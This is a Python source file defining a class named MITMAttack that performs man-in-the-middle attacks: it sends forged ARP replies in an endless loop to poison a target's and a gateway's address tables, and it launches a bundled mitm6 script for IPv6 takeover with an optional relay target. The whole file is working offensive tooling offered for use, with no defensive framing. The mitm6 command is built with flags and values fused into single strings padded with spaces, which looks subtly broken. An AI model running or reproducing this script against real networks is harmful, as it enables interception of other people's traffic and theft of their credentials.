import netifaces
import subprocess
import os
import ipaddress
from scapy.all import ARP, Ether, sendp
import logging
import time

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class MITMAttack:
    def set_attributes(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.mac = self.get_interface_mac(self.interface)
        self.broadcast = "ff:ff:ff:ff:ff:ff"

    def get_interface_mac(self, interface):
        try:
            return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
        except ValueError:
            raise ValueError(f"Invalid interface '{interface}'")

    def validate_ip(self, ip):
        try:
            return ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            raise ValueError(f"Invalid IP address '{ip}'")

    def _create_arp_response(self, source_ip, target_ip, target_mac):
        return Ether(src=self.mac, dst=target_mac) / ARP(
            op=2, hwsrc=self.mac, hwdst=target_mac, psrc=source_ip, pdst=target_ip
        )

    def run_attack(self):
        arp_response_target = self._create_arp_response(
            self.gateway_ip, self.target_ip, self.broadcast
        )
        arp_response_gateway = self._create_arp_response(
            self.target_ip, self.gateway_ip, self.broadcast
        )

        logging.info("MITM Running... Press Ctrl+C to stop the attack.")
        try:
            while True:
                sendp(arp_response_target, iface=self.interface)
                sendp(arp_response_gateway, iface=self.interface)
                time.sleep(2)  # Add sleep to prevent overloading the network
        except KeyboardInterrupt:
            logging.info("\nMITM Attack Stopped.")

    def mitm6(
        self,
        interface=None,
        localdomain=None,
        ipv4=None,
        ipv6=None,
        mac=None,
        relay_target=None,
    ):
        logging.info(
            "Attacking {} with packets from {}...".format(interface, ipv4 or ipv6)
        )
        path_to_executable = os.path.join(os.path.dirname(__file__), "mitm/mitm6.py")
        command = [
            "python3",
            path_to_executable,
            f" -i {str(interface)}" if interface else "",
            f" -l {str(localdomain)}" if localdomain else "",
            f" -4 {str(ipv4)}" if ipv4 else "",
            f" -6 {str(ipv6)}" if ipv6 else "",
            f" -m {str(mac)}" if mac else "",
            f" -r {str(relay_target)}" if relay_target else "",
        ]
        subprocess.run(command)
